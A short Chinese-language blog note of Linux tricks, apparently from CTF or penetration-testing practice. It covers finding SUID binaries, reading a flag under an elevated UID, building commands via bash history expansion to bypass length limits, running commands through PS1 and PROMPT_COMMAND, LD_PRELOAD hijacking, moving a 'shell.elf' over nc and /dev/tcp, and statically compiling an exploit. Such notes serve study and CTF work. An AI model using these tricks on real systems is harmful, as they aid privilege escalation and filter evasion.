---
title: "linux杂项笔记"
pubDatetime: 2025-07-29T21:06:41.000+08:00
description: "linux杂项笔记"
tags: ["linux","misc"]
---
## SUID

```sh
find / -perm -4000 -type f 2>/dev/null
```
只对二进制文件生效，对shell脚本无效

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    printf("Real UID: %d, Effective UID: %d\n", getuid(), geteuid());
    // Real UID: 1000, Effective UID: 0

    system("cat flag"); // 底层通过execvp启动shell，自动丢弃SUID，使用Real UID， permission deny

    FILE *fp = fopen("/flag", "r"); // 检查Effective UID，成功读取文件内容
    if (fp == NULL) {
        perror("fopen");
        exit(1);
    }
    char buffer[100];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);
    }
    fclose(fp);
    return 0;
}
```

## 短命令执行

三个字符

```sh
c
# c: command not found
!!a
# ca: command not found
!!t
# cat (waiting)
!!<
# cat<
!!a
# cat a -> hello world
```
由于历史扩展(!)是最先进行的,所以可以使用变量,重定向符,管道等操作
```sh
e
!!c
!!h
!!o
!!$
!!{ 
# 这里会判定没有输入完, 需要手动结束
!!I
!!F
!!S
!!}
!!a
!!|
!!b
!!a
!!s
!!e
!!6
!!4
# echo a|base64
```

## 可能用于命令执行的环境变量

### PS1
效果上相当于每次执行命令后被echo
```sh
export PS1="${PS1} \$(whoami > /tmp/res)"
```

### PROMPT_COMMAND
每次执行命令后执行
```sh
export PROMPT_COMMAND="whoami>/tmp/res"
```

## LD_PRELOAD
指定在命令执行前加载的.so文件，配合.so文件上传。详见[ld_preload](../ld_preload劫持.md)

## 极简文件传输

```bash
nc -q 0 -lp 8080 < shell.elf
cat < /dev/tcp/127.0.0.1/8080 > 1.elf

nc -l 12345 > received.file
cat myfile | nc -q 0 localhost 12345
```

## find
排除某些路径
```bash
find . \( -path './node_modules' -o -path './dist' -o -path './.git' \) -prune -o -type f -print
```

## ssh
从私钥生成公钥
```bash
ssh-keygen -y -f ~/.ssh/id_rsa
```

解决ssh不支持过时算法问题
`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.48.140.173`

## 兼容性静态编译

musl-gcc -static -O2 -pipe -march=x86-64 -mtune=generic -idirafter /usr/include -idirafter /usr/include/x86_64-linux-gnu -o dirtyfrag exp.c